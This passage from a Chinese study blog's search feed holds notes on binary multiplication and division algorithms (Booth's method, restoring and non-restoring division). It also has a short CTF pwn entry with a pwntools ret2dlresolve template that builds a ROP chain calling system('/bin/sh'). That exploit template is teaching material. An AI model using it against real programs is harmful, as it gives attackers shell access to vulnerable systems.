若Yn＋1＞Yn，部分积＋[X]补。          若Yn&#x3D;0，Yn+1&#x3D;0，部分积＋0，右移     若Yn&#x3D;0，Yn+1&#x3D;1，部分积＋[X]补，右移     若Yn&#x3D;1，Yn+1&#x3D;0，部分积＋[-X]补，右移     若Yn&#x3D;1，Yn+1&#x3D;1，部分积＋0，右移     最后一次加法运算不移位<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505013239.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505013145.png"></p><h4 id="定点数补码两位乘（比较法）"><a href="#定点数补码两位乘（比较法）" class="headerlink" title="定点数补码两位乘（比较法）"></a>定点数补码两位乘（比较法）</h4><pre class="line-numbers language-none"><code class="language-none">补码两位乘法，根据附加位和部分积后两位值的情况，确定下一步操作。即根据当前的Yn-1,Yn,Yn+1的值，来确定下一步的操作。组合值为（Yn+Yn+1-2*Yn-1），组合值为a，就加上a*[X]补<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505014225.png" alt="微信图片_20220505014225"></p><p>太不好解释了，直接粘贴ppt了</p><p>补码两位乘比较法规则说明</p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505014227.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505014230.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505014232.png" alt="微信图片_20220505014232"></p><h2 id="二进制除法运算"><a href="#二进制除法运算" class="headerlink" title="二进制除法运算"></a>二进制除法运算</h2><h3 id="定点原码一位除"><a href="#定点原码一位除" class="headerlink" title="定点原码一位除"></a>定点原码一位除</h3><h4 id="恢复余数法"><a href="#恢复余数法" class="headerlink" title="恢复余数法"></a>恢复余数法</h4><pre class="line-numbers language-none"><code class="language-none">符号位单独处理，C0&#x3D;X0⊕Y0,运算时采用绝对值进行运算。要求|X|&lt;|Y|,否则溢出|X|-|Y|&#x3D;R0,若R0&lt;0;商0，然后R0+|Y|,恢复余数，运算完后左移一位|X|-|Y|&#x3D;R0,若R0&gt;&#x3D;0;商1，运算完后左移一位<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>恢复余数法规则：</p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505015553.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505015555.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505015558.png"></p><h4 id="加减交替法"><a href="#加减交替法" class="headerlink" title="加减交替法"></a>加减交替法</h4><pre class="line-numbers language-none"><code class="language-none">与恢复余数法不同的是，在每次运算完成后，判断余数R0的正负。若R0&gt;&#x3D;0，上1，余数左移一位，减去|Y0|（等价于 +[-|Y0|]补 ），余数为正数，表明上一步够减，因此减去|Y0|；若R0&lt;0，上0，余数左移一位，加上|Y0|，余数为负数，表明上一步不够减，因此加上|Y0|。最开始运算为|X0|-|Y0|。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>原码一位除加减交替法规则</p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505020432.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505020435.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505020438.png"></p><h3 id="定点补码一位除"><a href="#定点补码一位除" class="headerlink" title="定点补码一位除"></a>定点补码一位除</h3><h4 id="加减交替法-1"><a href="#加减交替法-1" class="headerlink" title="加减交替法"></a>加减交替法</h4><pre class="line-numbers language-none"><code class="language-none">被除数采用双符号位，除数采用单符号位。第一步根据除数与被除数的符号来进行下一步操作：    被除数与除数同号，[X]补-[Y]补    被除数与除数异号，[X]补+[Y]补第二步（之后）根据余数和除数的符号判断下一步操作：    余除同号，上商1，左移一位，-[Y]补    余除异号，上商0，左移一位，+[Y]补补码除法求商有误差，求出来的商为反码，需要对商进行修正，一般末位恒置一余数也需要进行修正，余数与被除数符号一致。不一致时，需要恢复余数。若为正商，余除异号，[Ri+1]补+[Y]补；若为负商，余除同号，[Ri+1]补-[Y]补。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505022411.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505022414.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505022417.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505022420.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505022423.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505022426.png"></p><h4 id="比较法-1"><a href="#比较法-1" class="headerlink" title="比较法"></a>比较法</h4><pre class="line-numbers language-none"><code class="language-none">和加减交替法基本上一致，但是改进了第一步的判断。将第一步的被除数看做余数，直接与除数比较，采用统一的上商计算方法。（第一步上来就根据被除数正负上商，并左移）规则：    余除同号，上商1，左移一位，-[Y]补（减去除数）    余除异号，上商0，左移一位，+[Y]补（加上除数）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505023227.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505023230.png"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><h3 id="乘法文章推荐"><a href="#乘法文章推荐" class="headerlink" title="乘法文章推荐"></a>乘法文章推荐</h3><p><a href="https://blog.csdn.net/qq_43309315/article/details/107582972">https://blog.csdn.net/qq_43309315/article/details/107582972</a></p><h3 id="除法文章推荐"><a href="#除法文章推荐" class="headerlink" title="除法文章推荐"></a>除法文章推荐</h3><p><a href="https://blog.csdn.net/qq_45954145/article/details/118405136">https://blog.csdn.net/qq_45954145/article/details/118405136</a></p><p><a href="https://blog.csdn.net/qq_45954145/article/details/118405462">https://blog.csdn.net/qq_45954145/article/details/118405462</a></p>]]></content>
      
      
      <categories>
          
          <category> 计算机组成原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机组成原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwntools构造ret2dlresolve模板</title>
      <link href="/posts/1010.html"/>
      <url>/posts/1010.html</url>
      
        <content type="html"><![CDATA[<h1 id="pwntools构造ret2dlresolve模板"><a href="#pwntools构造ret2dlresolve模板" class="headerlink" title="pwntools构造ret2dlresolve模板"></a>pwntools构造ret2dlresolve模板</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python">Help on class Ret2dlresolvePayload in module pwnlib.rop.ret2dlresolve:class Ret2dlresolvePayload(__builtin__.object) |  Methods defined here: |   |  __init__(self, elf, symbol, args, data_addr&#x3D;None) |   |  ---------------------------------------------------------------------- |  Data descriptors defined here: |   |  __dict__ |      dictionary for instance variables (if defined) |   |  __weakref__ |      list of weak references to the object (if defined)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>elf：相应的文件</p><p>symbol：函数名称</p><p>args：函数参数</p><p>data_addr：该payload所在的地址(默认会会放在bss比较高的地址上)</p><p>常用方法（用之前要设置context.binary和elf）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">dlresolve &#x3D; Ret2dlresolvePayload(elf,symbol&#x3D;&quot;system&quot;,args&#x3D;[&quot;&#x2F;bin&#x2F;sh&quot;],data_addr&#x3D;0x804ad00)#data_addr直接默认也行，它会自己找到一个合适的地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>print(rop.dump())可以查看rop链内容</p><p>以上来自TTYflag师傅的介绍</p><p>在使用前先指定</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">rop&#x3D;ROP(&quot;.&#x2F;pwn&quot;)#pwntools模板dlresolve &#x3D; Ret2dlresolvePayload(elf, symbol&#x3D;&quot;system&quot;, args&#x3D;[&quot;&#x2F;bin&#x2F;sh&quot;])rop.read(0, dlresolve.data_addr)rop.ret2dlresolve(dlresolve)info(rop.dump()) #查看rop信息payload&#x3D;fit(&#123;0x4C: rop.chain(), 0x100: dlresolve.payload&#125;)#0x4c是写入rop链的地方，0x100是read读入的大小。#fit就是填充一下r.sendline(payload)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
